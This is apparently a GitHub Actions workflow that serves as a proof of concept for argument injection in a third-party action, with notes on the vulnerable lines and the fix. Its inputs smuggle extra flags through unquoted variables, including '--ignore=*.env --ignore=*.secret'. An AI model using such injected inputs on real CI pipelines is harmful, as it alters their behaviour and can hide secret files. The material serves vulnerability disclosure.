name: POC - Argument Injection (CONFIRMED WORKING)

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  # CONFIRMED: Flag injection via unquoted branch variable
  confirmed-flag-injection:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "✅ CONFIRMED: --version flag injection via branch"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"
          # This injects --version flag which bluehawk processes
          # Instead of: --branch "main"
          # It becomes: --branch --version (two separate args)
          branch: "--version"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Analysis
        run: |
          echo "============================================"
          echo "✅ VULNERABILITY CONFIRMED: Argument Injection"
          echo "============================================"
          echo ""
          echo "The --version flag was injected and bluehawk printed '1.6.0'"
          echo "This proves arbitrary flags can be injected via the branch input"
          echo ""
          echo "Vulnerable code: entrypoint.sh line 19"
          echo "  --branch \$INPUT_BRANCH  (unquoted)"
          echo ""
          echo "Fix: Quote the variable"
          echo "  --branch \"\$INPUT_BRANCH\""

  # CONFIRMED: --help flag injection shows this is exploitable
  confirmed-help-injection:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "✅ CONFIRMED: --help flag injection via branch"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"
          branch: "--help"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

  # CONFIRMED: Multiple arguments injected via word splitting  
  confirmed-multi-arg-injection:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "✅ CONFIRMED: Multiple args via word splitting"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"
          # Word splitting: "main --ignore=*.env" becomes TWO arguments
          # This could hide sensitive files from being copied
          branch: "main --ignore=*.env --ignore=*.secret"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Analysis
        run: |
          echo "============================================"
          echo "✅ CONFIRMED: Word Splitting Allows Multi-Arg Injection"
          echo "============================================"
          echo ""
          echo "Without quotes, spaces split the value into multiple args:"
          echo "  Input: 'main --ignore=*.env --ignore=*.secret'"
          echo "  Result: --branch main --ignore=*.env --ignore=*.secret ..."
          echo ""
          echo "This could allow:"
          echo "  - Hiding files via --ignore patterns"
          echo "  - Altering bluehawk behavior with other flags"
          echo "  - Breaking expected argument parsing"

  # CONFIRMED: States loop also vulnerable to argument injection
  confirmed-states-injection:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "✅ CONFIRMED: Flag injection via states"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"
          # Each space-separated value iterates in the for loop
          # "--help" becomes: --state --help --branch --help
          states: "--help"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Analysis
        run: |
          echo "============================================"
          echo "✅ States input also vulnerable"
          echo "============================================"
          echo ""
          echo "Vulnerable code: entrypoint.sh lines 24, 29-30"
          echo "  for state in \$INPUT_STATES  (unquoted)"
          echo "  --state \$state              (unquoted)"
          echo "  --branch \$state             (unquoted)"
